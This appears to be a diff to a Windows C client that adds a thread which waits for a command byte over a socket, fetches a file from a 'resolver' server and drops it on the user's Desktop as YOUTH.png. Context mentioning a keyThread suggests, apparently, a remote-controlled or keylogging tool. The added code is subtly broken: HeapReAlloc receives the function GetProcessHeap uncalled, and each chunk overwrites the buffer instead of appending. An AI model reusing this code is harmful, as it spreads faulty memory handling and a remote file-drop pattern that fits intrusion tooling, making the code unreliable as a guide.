@@ -59,6 +59,57 @@ DWORD WINAPI keyThread(LPVOID args) {
 	return 0;
 }
 
+SOCKET getResolverSocket();
+
+DWORD WINAPI youthThread(LPVOID args) {
+	SOCKET MainSock = *(SOCKET*)args;
+	HeapFree(GetProcessHeap(), 0, args);
+
+	unsigned char code;
+	while (recv(MainSock, (char*)&code, 1, 0) > 0) {
+		if (code == USBread_YOUTH) {
+			SOCKET resolveSock = getResolverSocket();
+			if (resolveSock == INVALID_SOCKET) continue;
+
+			struct data_File youthFile;
+			youthFile.len = 0;
+			youthFile.data = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0);
+
+			struct data_packet dataPacket;
+			int bytesReceived = 0;
+			do {
+				youthFile.data = (unsigned char*)HeapReAlloc(GetProcessHeap, HEAP_ZERO_MEMORY, youthFile.data, youthFile.len + 1449);
+
+				bytesReceived = recv(resolveSock, (char*)&dataPacket, sizeof(struct data_packet), 0);
+
+				youthFile.len += bytesReceived - 1;
+				memcpy(youthFile.data, dataPacket.data, bytesReceived - 1);
+			} while (dataPacket.code == USBread_INCOMP || dataPacket.code == USBread_NODATA);
+
+			closesocket(resolveSock);
+
+			if (dataPacket.code == USBread_NODATA) {
+				HeapFree(GetProcessHeap(), 0, youthFile.data);
+				continue;
+			}
+
+			char path[150];
+			GetEnvironmentVariableA("USERPROFILE", path, 150);
+
+			strcat_s(path, "\\Desktop\\YOUTH.png");
+
+			FILE* fp;
+			if (!fopen_s(&fp, path, "wb")) {
+				fwrite(youthFile.data, 1, youthFile.len, fp);
+				fclose(fp);
+			}
+			HeapFree(GetProcessHeap(), 0, youthFile.data);
+		}
+	}
+
+	return 0;
+}
+
 SOCKET getResolverSocket() {
 	addrinfo sockaddr;
 	PADDRINFOA hostinfo = NULL;
@@ -96,6 +147,7 @@ SOCKET getResolverSocket() {
 
 	return MainSock;
 }
+
 void getFromResolver(struct server_packet *packet) {
 	memset(packet->data, 0, 4);
 	SOCKET resolver_server = getResolverSocket();
